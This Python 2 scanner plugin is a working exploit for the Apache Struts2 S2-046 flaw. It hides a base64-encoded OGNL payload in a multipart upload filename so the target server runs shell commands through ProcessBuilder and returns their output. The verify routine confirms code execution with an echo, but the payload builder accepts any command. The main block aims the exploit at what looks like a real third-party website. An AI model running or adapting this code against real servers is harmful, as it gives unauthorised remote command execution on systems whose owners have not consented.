#!/usr/bin/env python
# encoding: utf-8
from ..t import T
# from t  import T
import random
import base64
import sys
import urllib2
class P(T):
    def __init__(self):
        T.__init__(self)
        keywords=['struts']
    def make_s2_046_payload(self,command):
        payload_l = base64.decodestring(u'JXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFV0aWwuZ2V0RXhjbHVkZWRDbGFzc2VzKCkuY2xlYXIoKSkuKCNjb250ZXh0LnNldE1lbWJlckFjY2VzcygjZG0pKSkpLigjY21kPSc=')
        payload_r = base64.decodestring(u'JykuKCNpc3dpbj0oQGphdmEubGFuZy5TeXN0ZW1AZ2V0UHJvcGVydHkoJ29zLm5hbWUnKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCd3aW4nKSkpLigjY21kcz0oI2lzd2luP3snY21kLmV4ZScsJy9jJywjY21kfTp7Jy9iaW4vYmFzaCcsJy1jJywjY21kfSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNvbW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI3JvcykpLigjcm9zLmZsdXNoKCkpfQ==')
        end_null_byte = '0063'.decode('hex')
        payload = payload_l + command + payload_r + end_null_byte
        return payload
    

    def exec_s2_046_payload(self,url=None, payload=None):
        user_agent = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)'
        header_payload = 'multipart/form-data; boundary=---------------------------735323031399963166993862150'
        headers = {'User-Agent': user_agent,
               'Content-Type': header_payload}
        body_payload = '''-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name="foo"; filename="{0}"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--'''.format(payload) 
        response=None
        result=''
        try:
            req = urllib2.Request(url, headers=headers,data=body_payload)
            response = urllib2.urlopen(req)
        except Exception as e:
            print e
        else:
            result = response.read()
        finally:
            if response is not None:
                response.close()
        return result
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        target_url = ''
        target_url = 'http://' + ip + ':' + port

        if productname.get('path', ''):
            target_url = 'http://' + ip + ':' + port + productname.get('path', '')
        else:
            from script import linktool
            listarray = linktool.getaction(target_url)
            if len(listarray) > 0:
                target_url = listarray[0]
            else:
                target_url = 'http://' + ip + ':' + port + '/login.action'

        result = {}
        timeout=3
        result['result']=False
        res=None
        s=None


        try:
            randint1 = str(random.randint(1000, 10000))
            payload = self.make_s2_046_payload('echo X-Test-'+randint1)
            temp_result = self.exec_s2_046_payload(target_url, payload)
            
            if 'X-Test-%s' % (randint1) in temp_result:
                info = target_url + "struts046  Vul"
                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='struts046 Vul'
                result['VerifyInfo']['URL'] =target_url
                result['VerifyInfo']['payload']=payload
                result['VerifyInfo']['result'] =info
                return result

        except Exception,e:
            print e
            return result
        finally:
            if s is not None:
                s.close()
                del s



        # return result

if __name__ == '__main__':
    print P().verify(ip='www.healthmanage.cn',port='80')
